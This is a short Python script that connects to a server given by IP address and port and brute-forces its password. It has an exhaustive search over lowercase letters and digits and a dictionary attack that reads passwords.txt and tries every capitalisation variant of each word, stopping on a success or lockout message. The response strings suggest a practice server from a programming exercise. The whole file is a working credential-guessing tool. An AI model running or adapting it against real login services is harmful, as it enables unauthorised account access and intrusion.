import sys
import socket
import itertools


def brute_force():
    any_signs = 'abcdefghijklmnopqrstuvwxyz0123456789'

    password_length = 1
    while True:
        for possible_password in itertools.product(any_signs, repeat=password_length):
            possible_password = ''.join(possible_password)

            my_socket.send(possible_password.encode())
            response = my_socket.recv(1024).decode()

            if response == 'Connection success!':
                return possible_password
            elif response == 'Too many attempts':
                return None

        password_length += 1


def gen_of_passwords(password):
    for n in range(2 ** len(password)):
        bin_n = list(bin(n))
        bin_n.pop(0)
        bin_n.pop(0)
        extra_zero = ['0'] * (len(password) - len(bin_n))
        bin_n = extra_zero + bin_n

        possible_password = ""
        for i in range(len(password)):
            if bin_n[i] == '0' or password[i].isdigit():
                possible_password += password[i]
            else:
                possible_password += chr(ord(password[i]) - 32)

        yield possible_password


def brute_force_with_dict():
    with open('passwords.txt', 'r', encoding='utf-8') as passwords:
        for password in passwords:
            gen = gen_of_passwords(password.rstrip('\n'))
            for possible_password in gen:
                my_socket.send(possible_password.encode())
                response = my_socket.recv(1024).decode()

                if response == 'Connection success!':
                    return possible_password
                elif response == 'Too many attempts':
                    return None


args = sys.argv

with socket.socket() as my_socket:
    IP_address = args[1]
    port = int(args[2])

    my_socket.connect((IP_address, port))

    password = brute_force_with_dict()
    if password is not None:
        print(password)
